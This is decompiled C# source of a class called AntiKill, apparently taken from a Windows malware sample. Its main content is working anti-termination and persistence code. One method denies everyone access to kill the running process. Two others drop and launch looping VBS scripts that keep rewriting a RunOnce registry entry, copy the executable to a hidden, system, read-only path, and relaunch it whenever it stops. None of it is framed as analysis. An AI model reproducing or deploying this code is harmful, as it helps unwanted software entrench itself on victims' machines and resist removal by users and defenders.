using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200000E RID: 14
[StandardModule]
internal sealed class AntiKill
{
	// Token: 0x060000A6 RID: 166
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);

	// Token: 0x060000A7 RID: 167
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	// Token: 0x060000A8 RID: 168
	[DllImport("kernel32.dll")]
	public static extern IntPtr GetCurrentProcess();

	// Token: 0x060000A9 RID: 169 RVA: 0x0000C10C File Offset: 0x0000A30C
	public static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
	{
		byte[] array = new byte[2];
		uint num;
		AntiKill.GetKernelObjectSecurity(processHandle, 4, array, 0u, ref num);
		array = new byte[num + 1u];
		if ((ulong)num < 0UL || (ulong)num > 32767UL)
		{
			throw new Win32Exception();
		}
		if (!AntiKill.GetKernelObjectSecurity(processHandle, 4, array, num, ref num))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(array, 0);
	}

	// Token: 0x060000AA RID: 170 RVA: 0x0000C168 File Offset: 0x0000A368
	public static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
	{
		byte[] array = new byte[dacl.BinaryLength - 1 + 1];
		dacl.GetBinaryForm(array, 0);
		if (!AntiKill.SetKernelObjectSecurity(processHandle, 4, array))
		{
			throw new Win32Exception();
		}
	}

	// Token: 0x060000AB RID: 171 RVA: 0x0000C1A0 File Offset: 0x0000A3A0
	public static void EnableProtection()
	{
		try
		{
			IntPtr currentProcess = AntiKill.GetCurrentProcess();
			object processSecurityDescriptor = AntiKill.GetProcessSecurityDescriptor(currentProcess);
			NewLateBinding.LateCall(NewLateBinding.LateGet(processSecurityDescriptor, null, "DiscretionaryAcl", new object[0], null, null, null), null, "InsertAce", new object[]
			{
				0,
				new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null)
			}, null, null, null, true);
			AntiKill.SetProcessSecurityDescriptor(currentProcess, (RawSecurityDescriptor)processSecurityDescriptor);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060000AC RID: 172 RVA: 0x0000C234 File Offset: 0x0000A434
	public static void regpersistence(string name, string tpath)
	{
		if (File.Exists(Interaction.Environ("localappdata") + "\\Execution2.vbs"))
		{
			File.Delete(Interaction.Environ("localappdata") + "\\Execution2.vbs");
		}
		string value = string.Concat(new string[]
		{
			"on error resume next\r\nDo While True\r\n\r\nSet oReg = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\default:StdRegProv\")\r\noReg.GetStringValue &H80000001, \"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\", \"",
			name,
			"\", strValue\r\nIf IsNull(strValue) Then\r\n\r\nset wshShell = CreateObject( \"WScript.Shell\" )\r\nwshShell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\",
			name,
			"\", \"",
			tpath,
			"\"\r\nset filesys = CreateObject(\"Scripting.FileSystemObject\")\r\nfilesys.CopyFile\"",
			Process.GetCurrentProcess().MainModule.FileName,
			"\", \"",
			tpath,
			"\"\r\nset f = filesys.GetFile(\"",
			tpath,
			"\")\r\nf.attributes = 7\r\nEnd If\r\nWScript.Sleep 1000\r\nLoop"
		});
		TextWriter textWriter = new StreamWriter(Interaction.Environ("localappdata") + "\\Execution2.vbs");
		textWriter.Write(value);
		textWriter.Close();
		Process.Start(Interaction.Environ("localappdata") + "\\Execution2.vbs");
	}

	// Token: 0x060000AD RID: 173 RVA: 0x0000C328 File Offset: 0x0000A528
	public static void procpersistence(string name, string tpath)
	{
		if (File.Exists(Interaction.Environ("localappdata") + "\\Execution3.vbs"))
		{
			File.Delete(Interaction.Environ("localappdata") + "\\Execution3.vbs");
		}
		string value = string.Concat(new string[]
		{
			"on error resume next\r\nset objWMIService = GetObject (\"winmgmts:\")\r\nfoundProc = False\r\nprocName = \"",
			name,
			"\"\r\nDo While True\r\nfor each Process in objWMIService.InstancesOf (\"Win32_Process\")\r\nIf StrComp(Process.Name,procName,vbTextCompare) = 0 then\r\nfoundProc = True\r\nEnd If\r\nNext\r\nIf foundProc = False Then\r\nCreateObject(\"WScript.Shell\").Run(\"\"\"",
			tpath,
			"\"\"\") \r\nEnd If\r\nfoundProc = False\r\nWScript.Sleep 1000\r\nLoop"
		});
		TextWriter textWriter = new StreamWriter(Interaction.Environ("localappdata") + "\\Execution3.vbs");
		textWriter.Write(value);
		textWriter.Close();
		Process.Start(Interaction.Environ("localappdata") + "\\Execution3.vbs");
	}
}
